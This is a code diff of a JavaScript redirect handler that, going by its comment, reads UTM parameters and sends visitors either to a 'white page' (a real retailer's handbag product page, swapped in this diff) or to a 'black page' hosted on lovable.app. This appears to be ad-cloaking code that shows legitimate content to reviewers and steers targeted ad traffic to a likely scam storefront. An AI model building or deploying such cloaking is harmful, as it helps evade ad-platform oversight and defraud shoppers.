@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.royalbagspa.com.au/chanel-caviar-classic-chain-wallet-black.html";
+    const whitePageURL = "https://www.davidjones.com/product/tony-bianco-zulu-tote-bag-27377688?navId=882531&colorId=2879123";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
